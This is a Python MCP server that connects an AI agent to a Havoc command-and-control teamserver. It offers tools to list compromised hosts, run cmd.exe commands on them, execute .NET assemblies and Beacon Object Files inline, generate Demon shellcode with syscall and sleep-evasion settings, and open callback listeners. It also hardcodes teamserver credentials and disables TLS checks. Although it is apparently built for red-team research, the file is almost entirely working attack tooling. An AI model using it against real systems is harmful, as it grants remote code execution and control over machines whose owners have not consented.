#!/usr/bin/env python3
"""
Havoc C2 MCP Server - Provides tool access to Havoc teamserver operations.

Tools:
- havoc_status: Check teamserver connection status
- havoc_list_agents: List connected agents
- havoc_shell: Execute shell command on agent
- havoc_inline_dotnet: Run .NET assembly inline on agent
- havoc_inline_execute: Run BOF inline on agent
- havoc_generate_payload: Generate Demon shellcode
- havoc_create_listener: Create HTTP/HTTPS listener
- havoc_health: Check connection health and stats
"""

import asyncio
import json
import ssl
import hashlib
import base64
import sqlite3
import time
from pathlib import Path
from typing import Any

import websockets
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import Tool, TextContent

# Configuration - can be overridden via environment
DEFAULT_TS_URL = "wss://127.0.0.1:40056/havoc/"
DEFAULT_USER = "jarvis"
DEFAULT_PASS = "testing123"
DEFAULT_DB_PATH = "/home/jam/clawd/havoc-research/teamserver/data/teamserver.db"


def agent_id_to_hex(agent_id: str) -> str:
    """Convert agent ID to hex format (how Havoc client displays it)."""
    try:
        # If already hex-looking (contains letters), return as-is
        if any(c in agent_id.lower() for c in 'abcdef') and len(agent_id) <= 10:
            return agent_id.lower()
        # Convert decimal to hex (without 0x prefix)
        return format(int(agent_id), 'x')
    except ValueError:
        return agent_id


class HavocClient:
    """Async client for Havoc teamserver WebSocket API."""
    
    def __init__(self, url: str = DEFAULT_TS_URL, user: str = DEFAULT_USER, password: str = DEFAULT_PASS):
        self.url = url
        self.user = user
        self.password = password
        self.ws = None
        self.authenticated = False
        self.connected_at = None
        self.messages_sent = 0
        self.messages_received = 0
        self._ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self._ssl_ctx.check_hostname = False
        self._ssl_ctx.verify_mode = ssl.CERT_NONE
    
    def is_alive(self) -> bool:
        """Return True if the WebSocket is open and authenticated."""
        return bool(self.ws and not self.ws.closed and self.authenticated)

    async def _send(self, payload: dict):
        if not self.ws:
            raise RuntimeError("Not connected")
        await self.ws.send(json.dumps(payload))
        self.messages_sent += 1

    async def _recv(self, timeout: float | None = None) -> str:
        if not self.ws:
            raise RuntimeError("Not connected")
        if timeout is None:
            msg = await self.ws.recv()
        else:
            msg = await asyncio.wait_for(self.ws.recv(), timeout=timeout)
        self.messages_received += 1
        return msg
    
    async def connect(self) -> bool:
        """Connect and authenticate to teamserver."""
        try:
            self.ws = await websockets.connect(
                self.url, 
                ssl=self._ssl_ctx, 
                max_size=50*1024*1024,
                ping_interval=None,
                ping_timeout=None
            )
            
            # Authenticate
            h = hashlib.sha3_256(self.password.encode()).hexdigest()
            await self._send({
                "Head": {"Event": 1, "User": self.user, "Time": "", "OneTime": ""},
                "Body": {"SubEvent": 3, "Info": {"User": self.user, "Password": h}}
            })
            
            # Wait for auth response
            while True:
                try:
                    msg = await self._recv(timeout=5)
                    d = json.loads(msg)
                    ev, sub = d["Head"]["Event"], d["Body"]["SubEvent"]
                    info = d["Body"].get("Info", {})
                    
                    if ev == 1 and sub == 1:
                        self.authenticated = True
                        self.connected_at = time.time()
                        self.messages_sent = 0
                        self.messages_received = 0
                        return True
                    elif ev == 1 and sub == 2:
                        # Error message
                        return False
                except asyncio.TimeoutError:
                    break
            
            return self.authenticated
        except Exception as e:
            return False
    
    async def disconnect(self):
        """Close connection."""
        if self.ws:
            await self.ws.close()
            self.ws = None
            self.authenticated = False
            self.connected_at = None
    
    async def send_command(self, event: int, sub_event: int, info: dict) -> list[dict]:
        """Send command and collect responses."""
        retry_delays = [1, 2, 4]
        last_error: Exception | None = None
        
        for attempt, delay in enumerate(retry_delays, start=1):
            try:
                if not self.is_alive():
                    if not await self.connect():
                        raise RuntimeError("Failed to connect to teamserver")
                
                await self._send({
                    "Head": {"Event": event, "User": self.user, "Time": "", "OneTime": ""},
                    "Body": {"SubEvent": sub_event, "Info": info}
                })
                
                responses = []
                try:
                    while True:
                        msg = await self._recv(timeout=30)
                        d = json.loads(msg)
                        responses.append(d)
                        # Check for completion markers
                        info = d["Body"].get("Info", {})
                        if "Output" in info or "Error" in info or "FileName" in info:
                            break
                except asyncio.TimeoutError:
                    pass
                
                return responses
            except (websockets.exceptions.ConnectionClosed, OSError, RuntimeError) as e:
                last_error = e
                print(f"[havoc] send_command retry {attempt}/3 after error: {e}")
                await asyncio.sleep(delay)
                await self.disconnect()
        
        if last_error:
            raise last_error
        raise RuntimeError("send_command failed without specific error")
    
    async def create_listener(self, name: str, host: str, port: str, secure: bool = False) -> dict:
        """Create HTTP/HTTPS listener."""
        await self._send({
            "Head": {"Event": 2, "User": self.user, "Time": "", "OneTime": ""},
            "Body": {"SubEvent": 1, "Info": {
                "Protocol": "Http", "Name": name,
                "Hosts": host, "HostBind": "0.0.0.0",
                "HostRotation": "round-robin",
                "PortBind": port, "PortConn": port,
                "Headers": "", "Uris": "",
                "HostHeader": "", "Secure": "true" if secure else "false",
                "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Proxy Enabled": "false",
            }}
        })
        
        # Wait for listener response
        try:
            while True:
                msg = await self._recv(timeout=10)
                d = json.loads(msg)
                if d["Head"]["Event"] == 2:
                    return d["Body"].get("Info", {})
        except asyncio.TimeoutError:
            return {"error": "timeout"}
    
    async def generate_payload(self, listener: str, arch: str = "x64", 
                                sleep_technique: str = "Foliage") -> bytes | None:
        """Generate Demon shellcode."""
        config = json.dumps({
            "Sleep": "2", "Jitter": "15",
            "Indirect Syscall": True,
            "Injection": {
                "Alloc": "Native/Syscall",
                "Execute": "Native/Syscall",
                "Spawn64": "C:\\Windows\\System32\\notepad.exe",
                "Spawn32": "C:\\Windows\\SysWOW64\\notepad.exe"
            },
            "Sleep Technique": sleep_technique,
            "Sleep Jmp Gadget": "None",
            "Stack Duplication": False,
            "Proxy Loading": "None (LdrLoadDll)",
            "Amsi/Etw Patch": "None",
            "Service Name": ""
        })
        
        await self._send({
            "Head": {"Event": 5, "User": self.user, "Time": "", "OneTime": ""},
            "Body": {"SubEvent": 2, "Info": {
                "AgentType": "Demon", "Listener": listener,
                "Arch": arch, "Format": "Windows Shellcode",
                "Config": config
            }}
        })
        
        # Wait for payload
        try:
            while True:
                msg = await self._recv(timeout=300)
                d = json.loads(msg)
                info = d["Body"].get("Info", {})
                
                if "FileName" in info and ("Payload" in info or "PayloadArray" in info):
                    raw = info.get("Payload") or info.get("PayloadArray")
                    if isinstance(raw, list):
                        return bytes(raw)
                    elif isinstance(raw, str):
                        return base64.b64decode(raw)
                    return raw
        except asyncio.TimeoutError:
            return None
    
    async def shell_command(self, agent_id: str, command: str) -> str:
        """Execute shell command on agent."""
        # Generate unique task ID
        task_id = str(int(time.time() * 1000))
        
        # Encode the command arguments for DEMON_COMMAND_PROC_CREATE
        # Args format: "State;Verbose;Piped;Process;ProcessArgsBase64"
        # State=0 (normal), Verbose=false, Piped=true (capture output)
        # NOTE: Must use full path to cmd.exe!
        proc_args = f"/c {command}"
        proc_args_b64 = base64.b64encode(proc_args.encode()).decode()
        args = f"0;false;true;C:\\\\Windows\\\\System32\\\\cmd.exe;{proc_args_b64}"
        
        # Event 0x7 = Session, SubEvent 0x3 = Input
        await self._send({
            "Head": {"Event": 7, "User": self.user, "Time": "", "OneTime": ""},
            "Body": {"SubEvent": 3, "Info": {
                "DemonID": agent_id_to_hex(str(agent_id)),
                "TaskID": task_id,
                "CommandLine": f"shell {command}",
                "CommandID": "4112",  # COMMAND_PROC
                "ProcCommand": "4",   # DEMON_COMMAND_PROC_CREATE
                "Args": args
            }}
        })
        
        # Wait for output - agent sleep is 2s+jitter, need longer timeout
        output_parts = []
        try:
            start = time.time()
            while time.time() - start < 60:  # 60 second total timeout
                msg = await self._recv(timeout=10)
                d = json.loads(msg)
                info = d["Body"].get("Info", {})
                
                # Check for output
                if "Output" in info:
                    output_parts.append(info["Output"])
                    # Check for completion markers
                    output_text = info["Output"]
                    if "received job" not in output_text.lower():
                        # Real output, might have more coming
                        continue
        except asyncio.TimeoutError:
            pass
        
        return "\n".join(output_parts) if output_parts else "[no output - check agent sleep interval]"
    
    async def inline_dotnet(self, agent_id: str, assembly_path: str, args: str = "") -> str:
        """Run .NET assembly inline on agent."""
        # Read and encode the assembly
        try:
            with open(assembly_path, "rb") as f:
                assembly_bytes = f.read()
            assembly_b64 = base64.b64encode(assembly_bytes).decode()
        except FileNotFoundError:
            return f"[error] Assembly file not found: {assembly_path}"
        except Exception as e:
            return f"[error] Failed to read assembly: {e}"
        
        # Generate unique task ID
        task_id = str(int(time.time() * 1000))
        assembly_name = Path(assembly_path).name
        
        # Event 0x7 = Session, SubEvent 0x3 = Input
        # COMMAND_ASSEMBLY_INLINE_EXECUTE = 0x2001 = 8193
        await self._send({
            "Head": {"Event": 7, "User": self.user, "Time": "", "OneTime": ""},
            "Body": {"SubEvent": 3, "Info": {
                "DemonID": agent_id_to_hex(str(agent_id)),
                "TaskID": task_id,
                "CommandLine": f"dotnet inline-execute {assembly_name} {args}".strip(),
                "CommandID": "8193",  # COMMAND_ASSEMBLY_INLINE_EXECUTE
                "Binary": assembly_b64,
                "Arguments": args
            }}
        })
        
        # Wait for output - .NET execution may take a while
        output_parts = []
        try:
            start = time.time()
            while time.time() - start < 120:  # 120 second total timeout
                msg = await self._recv(timeout=15)
                d = json.loads(msg)
                info = d["Body"].get("Info", {})
                
                if "Output" in info:
                    output_parts.append(info["Output"])
                    # Check for .NET completion markers
                    output_text = info["Output"]
                    if "DOTNET_INFO_FINISHED" in str(d) or "[+] Finished" in output_text:
                        break
        except asyncio.TimeoutError:
            pass
        
        return "\n".join(output_parts) if output_parts else "[no output - assembly may still be executing]"
    
    async def inline_execute(self, agent_id: str, bof_path: str, args: str = "") -> str:
        """Run BOF inline on agent."""
        # Read and encode the BOF
        try:
            with open(bof_path, "rb") as f:
                bof_bytes = f.read()
            bof_b64 = base64.b64encode(bof_bytes).decode()
        except FileNotFoundError:
            return f"[error] BOF file not found: {bof_path}"
        except Exception as e:
            return f"[error] Failed to read BOF: {e}"
        
        # Generate unique task ID
        task_id = str(int(time.time() * 1000))
        bof_name = Path(bof_path).name
        
        # Encode arguments (empty base64 if no args)
        args_b64 = base64.b64encode(args.encode()).decode() if args else ""
        
        # Event 0x7 = Session, SubEvent 0x3 = Input
        # COMMAND_INLINEEXECUTE = 20
        await self._send({
            "Head": {"Event": 7, "User": self.user, "Time": "", "OneTime": ""},
            "Body": {"SubEvent": 3, "Info": {
                "DemonID": agent_id_to_hex(str(agent_id)),
                "TaskID": task_id,
                "CommandLine": f"inline-execute {bof_name} {args}".strip(),
                "CommandID": "20",  # COMMAND_INLINEEXECUTE
                "Binary": bof_b64,
                "FunctionName": "go",  # Standard BOF entry point
                "Arguments": args_b64,
                "Flags": "default"
            }}
        })
        
        # Wait for output - BOF execution may take a while
        output_parts = []
        try:
            start = time.time()
            while time.time() - start < 120:  # 120 second total timeout
                msg = await self._recv(timeout=15)
                d = json.loads(msg)
                info = d["Body"].get("Info", {})
                
                if "Output" in info:
                    output_parts.append(info["Output"])
                    # Check for BOF completion markers
                    cmd_id = info.get("CommandID", "")
                    if cmd_id in ["3", "1", "2", "4"]:  # INLINEEXECUTE result codes
                        break
        except asyncio.TimeoutError:
            pass
        
        return "\n".join(output_parts) if output_parts else "[no output - BOF may still be executing]"


class HavocConnectionManager:
    """Singleton connection manager for HavocClient."""
    
    _instance = None
    _lock = asyncio.Lock()
    _reconnect_timeout = 10
    
    def __init__(self):
        self.client: HavocClient | None = None
    
    @classmethod
    async def get_client(cls, timeout: float | None = None) -> HavocClient:
        async with cls._lock:
            if cls._instance is None:
                cls._instance = cls()
            
            if cls._instance.client is None or not cls._instance.client.is_alive():
                if cls._instance.client:
                    await cls._instance.client.disconnect()
                cls._instance.client = HavocClient()
                
                connect_timeout = timeout if timeout is not None else cls._reconnect_timeout
                try:
                    connected = await asyncio.wait_for(
                        cls._instance.client.connect(),
                        timeout=connect_timeout
                    )
                except asyncio.TimeoutError as e:
                    raise RuntimeError("Timed out connecting to teamserver") from e
                
                if not connected:
                    raise RuntimeError("Failed to connect to teamserver")
            
            return cls._instance.client
    
    @classmethod
    async def disconnect(cls):
        async with cls._lock:
            if cls._instance and cls._instance.client:
                await cls._instance.client.disconnect()
    
    @classmethod
    async def health(cls, force_reconnect: bool = False) -> dict:
        async with cls._lock:
            if force_reconnect and cls._instance and cls._instance.client:
                await cls._instance.client.disconnect()
            
            if cls._instance is None:
                cls._instance = cls()
            
            client = cls._instance.client
            alive = bool(client and client.is_alive())
            uptime = 0
            if client and client.connected_at:
                uptime = int(time.time() - client.connected_at)
            
            return {
                "alive": alive,
                "uptime_seconds": uptime,
                "messages_sent": client.messages_sent if client else 0,
                "messages_received": client.messages_received if client else 0
            }


def get_agents_from_db(db_path: str = DEFAULT_DB_PATH) -> list[dict]:
    """Get agents from teamserver database."""
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        c.execute('''SELECT AgentID, Hostname, Username, InternalIP, 
                     ProcessName, ProcessPID, OSVersion, OSArch, LastCallIn 
                     FROM TS_Agents ORDER BY LastCallIn DESC''')
        rows = c.fetchall()
        conn.close()
        
        agents = []
        for row in rows:
            agents.append({
                "id": row[0],
                "hostname": row[1],
                "username": row[2],
                "ip": row[3],
                "process": row[4],
                "pid": row[5],
                "os": row[6],
                "arch": row[7],
                "last_seen": row[8]
            })
        return agents
    except Exception as e:
        return [{"error": str(e)}]


# Create MCP server
server = Server("havoc-mcp")


@server.list_tools()
async def list_tools() -> list[Tool]:
    """List available Havoc tools."""
    return [
        Tool(
            name="havoc_status",
            description="Check if Havoc teamserver is reachable and authenticate",
            inputSchema={
                "type": "object",
                "properties": {},
                "required": []
            }
        ),
        Tool(
            name="havoc_list_agents",
            description="List all connected Demon agents",
            inputSchema={
                "type": "object",
                "properties": {},
                "required": []
            }
        ),
        Tool(
            name="havoc_shell",
            description="Execute a shell command on a Demon agent",
            inputSchema={
                "type": "object",
                "properties": {
                    "agent_id": {"type": "string", "description": "Agent/Demon ID"},
                    "command": {"type": "string", "description": "Shell command to execute"}
                },
                "required": ["agent_id", "command"]
            }
        ),
        Tool(
            name="havoc_inline_dotnet",
            description="Run a .NET assembly inline on a Demon agent (tests ETW bypass)",
            inputSchema={
                "type": "object",
                "properties": {
                    "agent_id": {"type": "string", "description": "Agent/Demon ID"},
                    "assembly_path": {"type": "string", "description": "Path to .NET assembly"},
                    "args": {"type": "string", "description": "Arguments for assembly", "default": ""}
                },
                "required": ["agent_id", "assembly_path"]
            }
        ),
        Tool(
            name="havoc_inline_execute",
            description="Run a BOF (Beacon Object File) inline on a Demon agent",
            inputSchema={
                "type": "object",
                "properties": {
                    "agent_id": {"type": "string", "description": "Agent/Demon ID"},
                    "bof_path": {"type": "string", "description": "Path to BOF (.o file)"},
                    "args": {"type": "string", "description": "Arguments for BOF", "default": ""}
                },
                "required": ["agent_id", "bof_path"]
            }
        ),
        Tool(
            name="havoc_generate_payload",
            description="Generate Demon shellcode for a listener",
            inputSchema={
                "type": "object",
                "properties": {
                    "listener": {"type": "string", "description": "Listener name"},
                    "arch": {"type": "string", "description": "Architecture (x64/x86)", "default": "x64"},
                    "output_path": {"type": "string", "description": "Path to save shellcode"}
                },
                "required": ["listener", "output_path"]
            }
        ),
        Tool(
            name="havoc_create_listener",
            description="Create an HTTP/HTTPS listener",
            inputSchema={
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "Listener name"},
                    "host": {"type": "string", "description": "Callback host IP/domain"},
                    "port": {"type": "string", "description": "Listener port"},
                    "secure": {"type": "boolean", "description": "Use HTTPS", "default": False}
                },
                "required": ["name", "host", "port"]
            }
        ),
        Tool(
            name="havoc_health",
            description="Check connection health and stats (optional reconnect)",
            inputSchema={
                "type": "object",
                "properties": {
                    "force_reconnect": {"type": "boolean", "description": "Force reconnection", "default": False}
                },
                "required": []
            }
        )
    ]


@server.call_tool()
async def call_tool(name: str, arguments: dict[str, Any]) -> list[TextContent]:
    """Handle tool calls."""
    
    if name == "havoc_status":
        try:
            await HavocConnectionManager.get_client()
            return [TextContent(type="text", text="✅ Teamserver connected and authenticated")]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Failed to connect to teamserver: {e}")]
    
    elif name == "havoc_list_agents":
        agents = get_agents_from_db()
        if not agents:
            return [TextContent(type="text", text="No agents found")]
        
        result = "Connected Agents:\n"
        for a in agents:
            if "error" in a:
                result += f"Error: {a['error']}\n"
            else:
                result += f"• {a['id']} | {a['hostname']}\\{a['username']} | {a['ip']} | {a['process']}:{a['pid']} | {a['last_seen']}\n"
        
        return [TextContent(type="text", text=result)]
    
    elif name == "havoc_shell":
        try:
            client = await HavocConnectionManager.get_client()
            output = await client.shell_command(arguments["agent_id"], arguments["command"])
            return [TextContent(type="text", text=f"Output:\n{output}")]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Error: {e}")]
    
    elif name == "havoc_inline_dotnet":
        try:
            client = await HavocConnectionManager.get_client()
            output = await client.inline_dotnet(
                arguments["agent_id"],
                arguments["assembly_path"],
                arguments.get("args", "")
            )
            return [TextContent(type="text", text=f"Output:\n{output}")]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Error: {e}")]
    
    elif name == "havoc_inline_execute":
        try:
            client = await HavocConnectionManager.get_client()
            output = await client.inline_execute(
                arguments["agent_id"],
                arguments["bof_path"],
                arguments.get("args", "")
            )
            return [TextContent(type="text", text=f"Output:\n{output}")]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Error: {e}")]
    
    elif name == "havoc_generate_payload":
        try:
            client = await HavocConnectionManager.get_client()
            payload = await client.generate_payload(
                arguments["listener"],
                arguments.get("arch", "x64")
            )
            
            if payload:
                with open(arguments["output_path"], "wb") as f:
                    f.write(payload)
                return [TextContent(type="text", text=f"✅ Payload saved to {arguments['output_path']} ({len(payload)} bytes)")]
            else:
                return [TextContent(type="text", text="❌ Failed to generate payload")]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Error: {e}")]
    
    elif name == "havoc_create_listener":
        try:
            client = await HavocConnectionManager.get_client()
            result = await client.create_listener(
                arguments["name"],
                arguments["host"],
                arguments["port"],
                arguments.get("secure", False)
            )
            
            if "error" in result:
                return [TextContent(type="text", text=f"❌ {result['error']}")]
            else:
                return [TextContent(type="text", text=f"✅ Listener '{arguments['name']}' created on {arguments['host']}:{arguments['port']}")]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Error: {e}")]
    
    elif name == "havoc_health":
        try:
            force = bool(arguments.get("force_reconnect", False))
            if force:
                await HavocConnectionManager.disconnect()
                await HavocConnectionManager.get_client()
            stats = await HavocConnectionManager.health(force_reconnect=False)
            status = "alive" if stats["alive"] else "dead"
            return [TextContent(
                type="text",
                text=(
                    "Connection Health:\n"
                    f"Status: {status}\n"
                    f"Uptime: {stats['uptime_seconds']}s\n"
                    f"Messages Sent: {stats['messages_sent']}\n"
                    f"Messages Received: {stats['messages_received']}"
                )
            )]
        except Exception as e:
            return [TextContent(type="text", text=f"❌ Error: {e}")]
    
    else:
        return [TextContent(type="text", text=f"Unknown tool: {name}")]


async def main():
    """Run the MCP server."""
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream, server.create_initialization_options())


if __name__ == "__main__":
    asyncio.run(main())
